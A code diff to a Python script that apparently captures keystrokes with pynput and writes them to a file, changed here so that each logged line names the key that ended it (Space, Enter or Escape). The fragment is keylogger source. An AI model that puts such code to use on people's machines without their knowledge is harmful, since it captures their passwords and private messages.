@@ -36,12 +36,14 @@ def on_press(key):
             escape_pressed = True
             # Log any pending input before exiting.
             if logged_string or current_keys:
-                log_keys()
+                log_keys("Line Break: Escape Key")
             return False
         elif key in [keyboard.Key.space, keyboard.Key.enter]:
+            # Identify the line breaker key
+            line_breaker = "Space" if key == keyboard.Key.space else "Enter"
             # Log as a line break if there's input; reset afterwards.
             if logged_string or current_keys:
-                log_keys()
+                log_keys(f"Line Break: {line_breaker} Key")
             logged_string = ""  # Prepare for new input.
         else:
             if hasattr(key, 'char'):
@@ -64,13 +66,14 @@ def on_press(key):
     except Exception as e:
         print(f"Error in on_press: {e}")
 
-def log_keys():
+def log_keys(message=""):
     global current_keys, logged_string
+    # Prepare the combination or single keys for logging
     combo = ' + '.join([key.name for key in current_keys] + [logged_string.strip()]) if current_keys else logged_string
-    if combo.strip():  # Ensure there's content to log.
+    # Add the optional message if provided (for line breakers)
+    combo = f"{combo}; {message}" if message else combo
+    if combo.strip():  # Ensure there's content to log
         write_to_file(combo)
-
-
 
 
 def on_release(key):
